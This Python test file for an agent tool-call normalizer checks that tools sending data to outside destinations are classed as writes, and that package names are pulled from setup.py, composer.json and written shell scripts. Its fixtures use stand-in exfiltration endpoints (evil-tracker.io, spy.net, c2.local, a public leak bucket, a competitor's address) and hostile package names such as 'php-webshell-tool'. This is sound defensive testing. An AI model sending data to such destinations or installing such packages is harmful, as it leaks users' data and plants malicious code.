"""v0.1.55: what RULE-MINE-03 round 6 (PSA #7421) found the engine did not read.

Read-named tools sending through argument names a fixed list missed (sync_webhook, stream_endpoint, upload_bucket,
mirror_url, report_url, email_summary_to, cc_email), packages in setup.py and composer.json, and install commands in a
shell script a tool writes. These tests read the engine's fields; decisions belong to the rule packs."""

import pytest

from gate.config import Config
from gate.normalize import normalize

CFG = Config(workspace="/work/repo")


def tool(name, **args):
    return normalize({"type": "tool", "name": name, "arguments": args}, CFG)


@pytest.mark.parametrize("key,value", [
    ("sync_webhook", "https://evil-tracker.io/collect"), ("stream_endpoint", "https://spy.net/ingest"),
    ("upload_bucket", "s3://public-leak-bucket/t.csv"), ("mirror_url", "https://dropbox-spy.com/sync"),
    ("report_url", "http://c2.local/status"), ("email_summary_to", "spy@competitor-inc.com"),
    ("cc_email", "audit-bot@external-vendor.com"), ("destinationBucket", "gs://leak/x")])
def test_named_send_keys_make_a_read_a_write(key, value):
    assert tool("mcp__x__list_sessions", status="active", **{key: value})["tool_verb_class"] == "write"


@pytest.mark.parametrize("key,value", [
    ("url", "https://docs.python.org/3/"), ("email", "ann@corp.com"), ("to", "2024-12-31"),
    ("report_type", "weekly"), ("source_url", "https://example.com/data.csv"), ("sync_status", "pending")])
def test_lookups_and_filters_stay_reads(key, value):
    assert tool("mcp__x__fetch_records", **{key: value})["tool_verb_class"] == "read"


def test_setup_py_and_composer_packages():
    r = tool("mcp__fs__edit_file", path="setup.py", content="install_requires=['data-exfil-lib', 'requests']")
    assert r["package_install"] and "data-exfil-lib" in r["packages"]
    r = tool("mcp__fs__edit_file", path="composer.json", content='{"require":{"php-webshell-tool":"^3.1","php":">=8"}}')
    assert "php-webshell-tool" in r["packages"] and "php" not in r["packages"]


def test_install_line_in_written_script_is_an_install():
    r = tool("mcp__fs__write_file", path="deploy.sh", content='echo "staging"\n# setup\npip install staging-helper\n')
    assert r["package_install"] and "staging-helper" in r["packages"]


def test_script_without_installs_has_no_packages():
    r = tool("mcp__fs__write_file", path="run.sh", content="#!/bin/bash\necho hello\nls -la\n")
    assert not r["package_install"]
